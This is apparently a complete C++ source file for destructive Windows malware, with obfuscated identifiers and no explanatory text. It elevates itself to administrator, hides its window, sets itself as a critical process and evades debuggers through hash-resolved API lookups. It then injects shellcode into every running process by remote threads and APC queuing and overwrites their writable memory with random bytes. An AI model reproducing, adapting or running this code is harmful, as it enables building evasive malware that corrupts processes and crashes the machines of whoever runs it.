#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <random>
#include <psapi.h>
#include <wchar.h>
#include <shellapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

#define _OBF(x) _##x##_obf
#define _VAR(x) _##x##_hidden

bool _OBF(CheckAdmin)() {
    BOOL _VAR(isAdmin) = FALSE;
    PSID _VAR(adminSid) = nullptr;
    SID_IDENTIFIER_AUTHORITY _VAR(ntAuth) = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&_VAR(ntAuth), 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &_VAR(adminSid))) {
        CheckTokenMembership(nullptr, _VAR(adminSid), &_VAR(isAdmin));
        FreeSid(_VAR(adminSid));
    }
    return _VAR(isAdmin) != FALSE;
}

void _OBF(Elevate)() {
    if (_OBF(CheckAdmin)()) return;
    wchar_t _VAR(path)[MAX_PATH];
    if (GetModuleFileNameW(nullptr, _VAR(path), MAX_PATH)) {
        SHELLEXECUTEINFOW _VAR(sei) = { sizeof(_VAR(sei)) };
        _VAR(sei).lpVerb = L"runas";
        _VAR(sei).lpFile = _VAR(path);
        _VAR(sei).nShow = SW_NORMAL;
        if (!ShellExecuteExW(&_VAR(sei))) {
            Sleep(1000);
            ShellExecuteExW(&_VAR(sei));
        }
        ExitProcess(0);
    }
}

class _OBF(Noise) {
private:
    std::vector<HANDLE> _VAR(handles);
    std::mt19937 _VAR(rng);

    void _VAR(hide)() {
        HWND w = GetConsoleWindow();
        if (w) ShowWindow(w, SW_HIDE);
    }

    void _VAR(xorSelf)() {
        HMODULE m = GetModuleHandleW(nullptr);
        MODULEINFO _VAR(mi);
        if (GetModuleInformation(GetCurrentProcess(), m, &_VAR(mi), sizeof(_VAR(mi)))) {
            DWORD old;
            if (VirtualProtect(_VAR(mi).lpBaseOfDll, _VAR(mi).SizeOfImage, PAGE_EXECUTE_READWRITE, &old)) {
                BYTE* p = (BYTE*)_VAR(mi).lpBaseOfDll;
                for (size_t i = 0; i < _VAR(mi).SizeOfImage; i += 16) p[i] ^= 0x5A;
                VirtualProtect(_VAR(mi).lpBaseOfDll, _VAR(mi).SizeOfImage, old, &old);
            }
        }
    }

public:
    _OBF(Noise)() : _VAR(rng)(std::random_device{}()) {}

    void _OBF(init)() {
        for (int i = 0; i < 50; ++i) {
            STARTUPINFOW si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            wchar_t cmd[256];
            int t = (_VAR(rng)() % 600) + 120;
            swprintf(cmd, 256, L"cmd.exe /c timeout /t %d >nul 2>&1", t);
            if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                               CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
                if (pi.hProcess) _VAR(handles).push_back(pi.hProcess);
            }
        }
        _VAR(hide)();
        _VAR(xorSelf)();
    }

    ~_OBF(Noise)() {
        for (auto h : _VAR(handles)) {
            if (h && h != INVALID_HANDLE_VALUE) {
                TerminateProcess(h, 0);
                CloseHandle(h);
            }
        }
    }
};

class _OBF(Shell) {
public:
    static std::vector<BYTE> _OBF(A)() {
        return {
            0x60, 0x9C,
            0x64, 0x8B, 0x15, 0x04, 0x00, 0x00, 0x00,
            0x8B, 0xD2,
            0x81, 0xEA, 0x04, 0x00, 0x00, 0x00,
            0xC6, 0x02, 0x41,
            0x83, 0xFA, 0x00,
            0x75, 0xF8,
            0x9D, 0x61, 0xC3
        };
    }
    static std::vector<BYTE> _OBF(B)() {
        return {
            0x55,
            0x8B, 0xEC,
            0x81, 0xEC, 0x00, 0x10, 0x00, 0x00,
            0x68, 0x41, 0x41, 0x41, 0x41,
            0x58,
            0x8D, 0x7D, 0xF0,
            0xB9, 0x00, 0x10, 0x00, 0x00,
            0xFC,
            0xF3, 0xAB,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x81, 0xC4, 0x00, 0x10, 0x00, 0x00,
            0x8B, 0xE5,
            0x5D,
            0xC3
        };
    }
};

class _OBF(MemScramble) {
private:
    std::mt19937 _VAR(rng){std::random_device{}()};

    void _VAR(scrambleRegion)(HANDLE h, LPVOID base, SIZE_T size) {
        if (!base || size == 0) return;
        std::vector<BYTE> _VAR(buf)(size);
        for (SIZE_T i = 0; i < size; ++i) _VAR(buf)[i] = (BYTE)_VAR(rng)();
        WriteProcessMemory(h, base, _VAR(buf).data(), size, nullptr);
    }

public:
    void _OBF(scrambleProcess)(DWORD pid) {
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h) return;
        MEMORY_BASIC_INFORMATION _VAR(mbi);
        LPVOID _VAR(addr) = nullptr;
        while (VirtualQueryEx(h, _VAR(addr), &_VAR(mbi), sizeof(_VAR(mbi)))) {
            if (_VAR(mbi).State == MEM_COMMIT && (_VAR(mbi).Protect & PAGE_READWRITE)) {
                _VAR(scrambleRegion)(h, _VAR(mbi).BaseAddress, _VAR(mbi).RegionSize);
            }
            _VAR(addr) = (LPVOID)((uintptr_t)_VAR(mbi).BaseAddress + _VAR(mbi).RegionSize);
        }
        CloseHandle(h);
    }
};

class _OBF(TaskMgrHide) {
private:
    typedef NTSTATUS(NTAPI* _VAR(NtSetInformationProcess))(HANDLE, int, PVOID, ULONG);
    typedef struct _VAR(BreakOnTermination) {
        BOOLEAN BreakOnTermination;
    } _VAR(BreakOnTermination), *_VAR(PBreakOnTermination);
    void _VAR(setCritical)() {
        HMODULE _VAR(hNtdll) = GetModuleHandleW(L"ntdll.dll");
        if (!_VAR(hNtdll)) return;
        _VAR(NtSetInformationProcess) _VAR(pNtSet) = (_VAR(NtSetInformationProcess))GetProcAddress(_VAR(hNtdll), "NtSetInformationProcess");
        if (!_VAR(pNtSet)) return;
        HANDLE _VAR(hSelf) = GetCurrentProcess();
        _VAR(BreakOnTermination) _VAR(crit) = { TRUE };
        _VAR(pNtSet)(_VAR(hSelf), 0x1D, &_VAR(crit), sizeof(_VAR(crit)));
    }
    void _VAR(detach)() {
        HMODULE _VAR(hKernel32) = GetModuleHandleW(L"kernel32.dll");
        if (!_VAR(hKernel32)) return;
        typedef BOOL(WINAPI* _VAR(FreeConsole))();
        _VAR(FreeConsole) _VAR(pFree) = (_VAR(FreeConsole))GetProcAddress(_VAR(hKernel32), "FreeConsole");
        if (_VAR(pFree)) _VAR(pFree)();
        HWND _VAR(hWnd) = GetConsoleWindow();
        if (_VAR(hWnd)) ShowWindow(_VAR(hWnd), SW_HIDE);
    }
public:
    void _OBF(hide)() {
        _VAR(detach)();
        _VAR(setCritical)();
    }
};

class _OBF(AntiDisasm) {
private:
    typedef BOOL(WINAPI* _VAR(IsDebuggerPresent))();
    typedef BOOL(WINAPI* _VAR(CheckRemoteDebuggerPresent))(HANDLE, PBOOL);
    typedef NTSTATUS(NTAPI* _VAR(NtQueryInformationProcess))(HANDLE, int, PVOID, ULONG, PULONG);
    std::mt19937 _VAR(rng){std::random_device{}()};
    DWORD _VAR(hashString)(const char* str) {
        DWORD _VAR(hash) = 0x12345678;
        while (*str) {
            _VAR(hash) = ((_VAR(hash) << 5) + _VAR(hash)) + *str++;
        }
        return _VAR(hash);
    }
    FARPROC _VAR(getApi)(DWORD hash) {
        HMODULE _VAR(hKernel32) = GetModuleHandleW(L"kernel32.dll");
        if (!_VAR(hKernel32)) return nullptr;
        PIMAGE_DOS_HEADER _VAR(pDos) = (PIMAGE_DOS_HEADER)_VAR(hKernel32);
        PIMAGE_NT_HEADERS _VAR(pNt) = (PIMAGE_NT_HEADERS)((BYTE*)_VAR(hKernel32) + _VAR(pDos)->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY _VAR(pExp) = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)_VAR(hKernel32) + _VAR(pNt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        PDWORD _VAR(pNames) = (PDWORD)((BYTE*)_VAR(hKernel32) + _VAR(pExp)->AddressOfNames);
        PWORD _VAR(pOrds) = (PWORD)((BYTE*)_VAR(hKernel32) + _VAR(pExp)->AddressOfNameOrdinals);
        PDWORD _VAR(pFuncs) = (PDWORD)((BYTE*)_VAR(hKernel32) + _VAR(pExp)->AddressOfFunctions);
        for (DWORD i = 0; i < _VAR(pExp)->NumberOfNames; i++) {
            char* _VAR(name) = (char*)((BYTE*)_VAR(hKernel32) + _VAR(pNames)[i]);
            if (_VAR(hashString)(_VAR(name)) == hash) {
                return (FARPROC)((BYTE*)_VAR(hKernel32) + _VAR(pFuncs)[_VAR(pOrds)[i]]);
            }
        }
        return nullptr;
    }
    void _VAR(integrityCheck)() {
        HMODULE _VAR(hMod) = GetModuleHandleW(nullptr);
        MODULEINFO _VAR(mi);
        if (!GetModuleInformation(GetCurrentProcess(), _VAR(hMod), &_VAR(mi), sizeof(_VAR(mi)))) return;
        BYTE* _VAR(pBase) = (BYTE*)_VAR(mi).lpBaseOfDll;
        for (size_t i = 0; i < _VAR(mi).SizeOfImage; i += 4096) {
            MEMORY_BASIC_INFORMATION _VAR(mbi);
            if (VirtualQuery(_VAR(pBase) + i, &_VAR(mbi), sizeof(_VAR(mbi))) && _VAR(mbi).State == MEM_COMMIT) {
                DWORD _VAR(old);
                if (VirtualProtect(_VAR(mbi).BaseAddress, _VAR(mbi).RegionSize, PAGE_READONLY, &_VAR(old))) {
                    BYTE _VAR(sum) = 0;
                    for (size_t j = 0; j < _VAR(mbi).RegionSize && j < 4096; j++) {
                        _VAR(sum) += ((BYTE*)_VAR(mbi).BaseAddress)[j];
                    }
                    if (_VAR(sum) == 0) ExitProcess(0);
                    VirtualProtect(_VAR(mbi).BaseAddress, _VAR(mbi).RegionSize, _VAR(old), &_VAR(old));
                }
            }
        }
    }
    void _VAR(mutateCode)() {
        HMODULE _VAR(hMod) = GetModuleHandleW(nullptr);
        MODULEINFO _VAR(mi);
        if (!GetModuleInformation(GetCurrentProcess(), _VAR(hMod), &_VAR(mi), sizeof(_VAR(mi)))) return;
        DWORD _VAR(old);
        if (VirtualProtect(_VAR(mi).lpBaseOfDll, _VAR(mi).SizeOfImage, PAGE_EXECUTE_READWRITE, &_VAR(old))) {
            BYTE* _VAR(pCode) = (BYTE*)_VAR(mi).lpBaseOfDll;
            for (size_t i = 0; i < _VAR(mi).SizeOfImage; i += 64) {
                if (_VAR(rng)() % 3 == 0) {
                    _VAR(pCode)[i] ^= 0xAA;
                    _VAR(pCode)[i + 1] ^= 0x55;
                }
            }
            VirtualProtect(_VAR(mi).lpBaseOfDll, _VAR(mi).SizeOfImage, _VAR(old), &_VAR(old));
        }
    }
public:
    void _OBF(init)() {
        _VAR(integrityCheck)();
        _VAR(mutateCode)();
        _VAR(IsDebuggerPresent) _VAR(pIsDbg) = (_VAR(IsDebuggerPresent))_VAR(getApi)(0xB2E4F7A9);
        if (_VAR(pIsDbg) && _VAR(pIsDbg)()) ExitProcess(0);
        _VAR(CheckRemoteDebuggerPresent) _VAR(pRemote) = (_VAR(CheckRemoteDebuggerPresent))_VAR(getApi)(0x5D8E2F1B);
        if (_VAR(pRemote)) {
            BOOL _VAR(isDbg) = FALSE;
            _VAR(pRemote)(GetCurrentProcess(), &_VAR(isDbg));
            if (_VAR(isDbg)) ExitProcess(0);
        }
        HMODULE _VAR(hNtdll) = GetModuleHandleW(L"ntdll.dll");
        if (_VAR(hNtdll)) {
            _VAR(NtQueryInformationProcess) _VAR(pNtQuery) = (_VAR(NtQueryInformationProcess))GetProcAddress(_VAR(hNtdll), "NtQueryInformationProcess");
            if (_VAR(pNtQuery)) {
                int _VAR(dbgPort) = 0;
                ULONG _VAR(ret);
                if (_VAR(pNtQuery)(GetCurrentProcess(), 7, &_VAR(dbgPort), sizeof(_VAR(dbgPort)), &_VAR(ret)) == 0) {
                    if (_VAR(dbgPort) != 0) ExitProcess(0);
                }
            }
        }
    }
};

class _OBF(Engine) {
private:
    _OBF(Noise) _VAR(noise);
    std::mt19937 _VAR(rnd){std::random_device{}()};

    std::vector<DWORD> _VAR(getPids)() {
        std::vector<DWORD> list;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return list;
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(snap, &pe)) {
            do {
                DWORD pid = pe.th32ProcessID;
                if (pid != 0 && pid != GetCurrentProcessId()) {
                    list.push_back(pid);
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        return list;
    }

    bool _VAR(m1)(DWORD pid) {
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h) return false;
        auto sc = _OBF(Shell)::_OBF(A)();
        LPVOID mem = VirtualAllocEx(h, nullptr, sc.size(),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) {
            CloseHandle(h);
            return false;
        }
        WriteProcessMemory(h, mem, sc.data(), sc.size(), nullptr);
        std::vector<HANDLE> threads;
        for (int i = 0; i < 4; ++i) {
            HANDLE th = CreateRemoteThread(h, nullptr, 0,
                                           (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
            if (th) threads.push_back(th);
        }
        for (HANDLE th : threads) {
            WaitForSingleObject(th, 3000);
            CloseHandle(th);
        }
        VirtualFreeEx(h, mem, 0, MEM_RELEASE);
        CloseHandle(h);
        return !threads.empty();
    }

    bool _VAR(m2)(DWORD pid) {
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h) return false;
        HANDLE tsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (tsnap == INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return false;
        }
        bool ok = false;
        THREADENTRY32 te = { sizeof(te) };
        auto sc = _OBF(Shell)::_OBF(B)();
        if (Thread32First(tsnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (th) {
                        LPVOID mem = VirtualAllocEx(h, nullptr, sc.size(),
                                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem) {
                            WriteProcessMemory(h, mem, sc.data(), sc.size(), nullptr);
                            for (int i = 0; i < 8; ++i) {
                                if (QueueUserAPC((PAPCFUNC)mem, th, 0)) ok = true;
                            }
                        }
                        CloseHandle(th);
                    }
                }
            } while (Thread32Next(tsnap, &te));
        }
        CloseHandle(tsnap);
        CloseHandle(h);
        return ok;
    }

public:
    void _OBF(run)() {
        _OBF(AntiDisasm) _VAR(ad);
        _VAR(ad)._OBF(init)();
        _VAR(noise)._OBF(init)();
        _OBF(TaskMgrHide) _VAR(th);
        _VAR(th)._OBF(hide)();
        auto targets = _VAR(getPids)();
        for (DWORD pid : targets) {
            _VAR(m1)(pid);
            _VAR(m2)(pid);
            _OBF(MemScramble) _VAR(ms);
            _VAR(ms)._OBF(scrambleProcess)(pid);
            Sleep(100);
        }
    }
};

int main() {
    _OBF(Elevate)();
    _OBF(Engine) obj;
    obj._OBF(run)();
    return 0;
}
